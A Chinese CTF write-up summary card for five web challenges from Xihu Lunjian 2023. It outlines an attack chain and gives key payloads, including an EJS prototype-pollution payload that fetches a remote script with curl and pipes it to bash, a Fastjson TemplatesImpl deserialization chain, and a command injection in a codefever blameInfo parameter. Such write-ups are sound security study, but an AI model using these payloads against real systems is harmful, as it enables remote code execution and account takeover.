---
title: "2023 西湖论剑 web 5 题 WP"
category: web
tags: ["西湖论剑", "web", "Node异常", "自定义zend_test.so", "RC4解密", "sudo提权"]
signals: ["西湖论剑 2023", "Node异常", "自定义zend_test.so", "RC4解密", "sudo提权", "Unicode损坏HTTP拆分", "EJS原型链污染", "Fastjson反序列化", "XString触发equals", "deserialize", "logic", "rce", "Node", "Unicode"]
difficulty: medium
source: "https://www.ctfiot.com/95359.html"
tools: ["curl"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2023 西湖论剑 web 5 题 WP

> 赛事：西湖论剑 2023 | 方向：web | 难度：medium | 工具：curl

## 一句话总结

Node 异常泄露 + 自定义 SO 加密 + Unicode HTTP 拆分污染 + Fastjson TemplatesImpl + codefever implode 注入。

## 攻击链

1. Node tolowercase 数组异常报错 → 泄露 cookie DASCTF{...} → php.ini 找 zend_test.so 路径 → 读出来逆 RC4 → 解密 index.php → RC4 加密一句话 → sudo chmod 777 /flag → Unicode 0x0100+ord 拆分 HTTP 头 → EJS constructor.prototype.outputFunctionName RCE → Fastjson @type 反序列化 XString+HotSwappableTargetSource → TemplatesImpl _bytecodes 加载恶意类 → git blameInfo 命令注入 revision=;`curl`&path=xxx → implode 拼空格绕过滤 → update cc_users 改 admin 密码进后台

## 关键 payload

```
{"constructor.prototype.outputFunctionName":"x;global.process.mainModule.require(''child_process'').exec(''curl http://x.x.x.x/bash.txt|bash'');var x"} ; HotSwappableTargetSource(JSONArray(TemplatesImpl)) 链 ; /api/repository/blameInfo?repository=rkey&revision=;`curl&path=xxxx>/tmp/b
```

## 经验教训

Node 数组 tolowercase 异常、Unicode 拆字节污染 HTTP、EJS 原型链污染、codefever implode 数组拼空格是 web 综合题常见套路。

## 标签

Node异常、自定义zend_test.so、RC4解密、sudo提权、Unicode损坏HTTP拆分、EJS原型链污染、Fastjson反序列化、XString触发equals、codefever_community、命令注入

## 参考来源

- https://www.ctfiot.com/95359.html
- 原文件：2023西湖论剑web-writeup题解wp.full.md
